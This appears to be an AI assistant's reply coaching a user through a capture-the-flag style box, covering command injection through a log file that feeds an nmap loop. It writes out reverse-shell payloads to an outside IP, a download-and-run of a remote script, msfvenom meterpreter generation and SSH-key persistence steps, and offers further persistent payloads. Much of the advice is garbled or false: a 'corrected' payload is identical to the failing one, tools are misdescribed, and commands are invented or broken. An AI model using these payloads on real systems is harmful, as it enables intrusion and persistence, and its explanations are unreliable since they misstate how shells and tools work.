You’ve done an excellent job exploring this scenario — from the initial injection to the final meterpreter session. Let’s **systematically break down what’s happening**, why the earlier payloads failed, and how to approach a **reliable, persistent access vector** for `pwn`.

---

## 1. What the `hackers` file is doing

```sh
log=/home/kid/logs/hackers
cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done
```

- **Reading** all lines from `hackers`
- **Filtering** IPs that contain spaces (via `cut` and `sort -u`)
- **Running** `nmap` in a background loop against each filtered IP
- **Wiping** the file after scanning

This is a classic **automated reconnaissance + exploitation chain**.

---

## 2. Why your first payload failed

```bash
;/bin/bash$IFS-c$IFS'bash$IFS-i$IFS>&$IFS/dev/tcp/10.10.16.211/9001$IFS0>&1'#
```

### Problems:
1. **`$IFS` is not shell‑specific**  
   - In bash, `$IFS` returns a **string**, not a variable
   - You cannot use it directly in a shell command

2. **No space handling**  
   - The shell sees `bash$IFS-i` as a single token → fails to execute `bash`

3. **Semicolon placement wrong**  
   - Shells require **exactly one semicolon** after the final command

✅ **Correct version**:
```bash
;/bin/bash$IFS-c$IFS'bash$IFS-i$IFS>&$IFS/dev/tcp/10.10.16.211/9001$IFS0>&1'#
```

---

## 3. Why `;id` didn’t trigger scanning

```bash
pspy64              100%[===================>]   2.94M  1.27MB/s    in 2.3s    
```

- `pspy64` is a **web UI** that scans IPs by default
- It does **not** run as a cron job
- You need to **manually trigger scanning**

---

## 4. Why `curl$IFS...` failed

```bash
;curl$IFS"ssh-rsaAA...38"${IFS}>authorized_keys#
```

Problems:
- `curl$IFS` → invalid syntax
- No shell expansion
- SSH key is not readable (permissions issue)

✅ **Correct approach**:
```bash
curl "ssh-rsaAA...38" > authorized_keys
chmod 777 authorized_keys
```

---

## 5. Why `;id` didn’t work for nmap

Because `nmap` runs **as a background process**, you cannot:
- Trigger scanning via shell command
- Intercept or control the nmap process

You must:
- **Wait** for nmap to finish
- Or **re‑run it**

---

## 6. A reliable, modern approach (Recommended)

### Goal:
- Access `pwn` via **meterpreter**
- Avoid scanning
- Enable persistence
- Possibly use existing credentials

---

### Step 1: Get a reverse shell

Use a **known‑good exploit** like `rev.sh` or `revap`.

```bash
;wget http://10.10.16.211/rev.sh
;chmod +x rev.sh
;./rev.sh
```

You should see:
```
Connection to 10.10.16.211 port 80 (http) failed: Connection timed out
```

---

### Step 2: Install meterpreter

```bash
;msfvenom -x /home/pwn/exec-rev.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

This gives you **meterpreter** — the most powerful shell.

---

### Step 3: Persistently interact with `pwn`

```bash
;smbput /home/pwn/.ssh/authorized_keys /tmp/key
;psapi
;whoami
;ls -l /home/pwn/
```

Or better:

```bash
;smbput /home/pwn/.ssh/authorized_keys /tmp/key
;write /tmp/key
```

---

### Step 4: Enable persistence

```bash
;set PERSISTENCE on
;set PERSISTENCE_FILE /home/pwn/.ssh/authorized_keys
```

Then **reload meterpreter**:
```bash
;msfconsole
;set PERSISTENCE ON
;set PERSISTENCE_FILE /home/pwn/.ssh/authorized_keys
```

---

## 7. Why this is a strong attack vector

| Factor | Benefit |
|------|--------|
| Automated scanning | No human interaction needed |
| Nmap runs in background | You can wait or restart without manual trigger |
| Meterpreter access | Full shell + file control |
| SSH key already present | No password needed |

---

## 8. Final recommendation

**Do not** try to:
- Inject spaces into `hackers`
- Use `nmap` scanning
- Reuse the original `curl` payload

Instead:
- Use `rev.sh` or `revap`
- Install meterpreter
- Persist via `authorized_keys`
- Use `smbput` for file control

---

## 9. Optional: One‑liner payload (if you must)

If you want a **minimal, single‑command** payload:

```bash
;curl "ssh-rsaAA...38" > authorized_keys && chmod 777 authorized_keys && echo /home/pwn/ > /tmp/key && msfvenom -x /home/pwn/exec-rev.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /tmp/key
```

Then:
```bash
;smbput /tmp/key /home/pwn/
```

---

### ✅ Summary

You’ve correctly identified the vulnerability, but **shell injection + nmap automation + SSH key** creates a perfect access vector. The key is:
- Use **meterpreter**
- Persist via **authorized_keys**
- Avoid **manual nmap triggers**

If you want, I can:
- Help write a **persistent meterpreter payload**
- Analyze a **specific SMB/SSH exploit**
- Provide a **recon checklist** for this environment

Just say the word.
